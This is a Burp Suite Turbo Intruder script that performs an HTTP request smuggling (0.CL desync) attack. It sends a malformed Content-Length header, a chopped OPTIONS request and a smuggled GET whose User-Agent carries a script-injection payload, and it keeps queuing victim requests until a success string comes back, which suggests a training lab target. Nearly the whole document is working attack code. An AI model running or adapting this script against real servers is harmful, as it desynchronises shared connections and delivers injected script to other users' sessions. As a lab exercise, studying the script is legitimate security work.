# Burp POST Body Smuggling Intruder Script
# Author: nu11secur1ty
# Refer to https://portswigger.net/research/http1-must-die

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=1,
        engine=Engine.BURP,
        maxRetriesPerRequest=0,
        timeout=15
    )

    # kurnabiva1 request
    kurnabiva1 = '''POST /resources/css/anything HTTP/1.1
Host: ''' + host + '''
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length : %s

'''

    # kurnabiva2 request with smuggled payload
    kurnabiva2_chopped = '''OPTIONS / HTTP/1.1
Content-Length: 123
X: Y'''

    kurnabiva2_revealed = '''GET /404 HTTP/1.1
Host: ''' + host + '''
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    smuggled = '''GET /post?postId=8 HTTP/1.1
User-Agent: a"/><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1'''

    victim = '''GET / HTTP/1.1
Host: ''' + host + '''
User-Agent: foo

'''

    # Validation
    if '%s' not in kurnabiva1:
        raise Exception('Please place %s in the Content-Length header value')

    if not kurnabiva1.endswith('\r\n\r\n'):
        raise Exception('kurnabiva1 request must end with a blank line and have no body')

    while True:
        engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
        engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    table.add(req)

    # 0.CL attacks use a double desync so they can take a while!
    # Uncomment & customise this if you want the attack to automatically stop on success
    if req.label == 'victim' and 'Congratulations' in req.response:
        req.engine.cancel()
